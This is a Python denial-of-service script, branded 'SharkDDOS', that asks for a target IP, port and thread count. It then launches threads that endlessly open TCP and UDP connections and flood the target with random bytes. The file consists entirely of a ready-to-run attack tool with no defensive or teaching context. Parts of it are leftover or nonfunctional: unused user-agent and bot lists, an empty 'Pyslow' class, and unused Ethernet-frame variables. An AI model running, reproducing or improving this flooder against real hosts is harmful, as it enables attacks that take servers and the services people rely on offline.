#!/usr/bin/env python3

import random
import threading
import socket
title = '''
      _ \        __ \  __ \              
     |   | |   | |   | |   |  _ \   __| 
     ___/  |   | |   | |   | (   |\__ \  
    _|    \__, |____/ ____/ \___/ ____/ 
           ____/                              
		   By SharkDDOS                    
'''
print(title)
ip = str(input(" IP:"))
port = int(input(" PORT:"))      # The port used by the server
threads = int(input("PING:"))

src_addr = "\x01\x02\x03\x04\x05\x06"
dst_addr = "\x01\x02\x03\x04\x05\x06"
payload = ("["*30)+"PAYLOAD"+("]"*30)
checksum = "\x1a\x2b\x3c\x4d"
ethertype = "\x08\x01"

def add_useragent():
	uagents = []
	uagents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36')
	uagents.append('(Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36')
	uagents.append('Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25')
	uagents.append('Opera/9.80 (X11; Linux i686; U; hu) Presto/2.9.168 Version/11.50')
	uagents.append('Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)')
	uagents.append('Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0')
	uagents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36 Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	uagents.append('Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)')
	return uagents

def add_bots():
	bots=[]
	bots.append('http://www.bing.com/search?q=%40&count=50&first=0')
	bots.append('http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8')
	return bots

class Pyslow:
	def __init__(self,
		        tgt,
		        port,
		        to,
		        sleep):
		self.tgt = tgt
		self.port = port
		self.to = to
		self.sleep = sleep
		self.method = ['GET','POST']
		self.pkt_count = 0

def run():
	data = random._urandom(1204)
	data2 = random._urandom(16)

	while True:
		try:
			n = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


			addr = (str(ip),int(port))
			s.connect((ip,int(port)))
			s.send(data2)
			for x in range(1):
				s.sendto(data,addr)
				s.send(data2)
				add_bots();add_useragent()

			print("[+] CONNECT TO", ip, port, "EXPORT =", threads)
		except:
			s.close()
			print("[*] Error Connnect")
                

			
for Y in range(threads):
		th = threading.Thread(target = run)
		th.start()
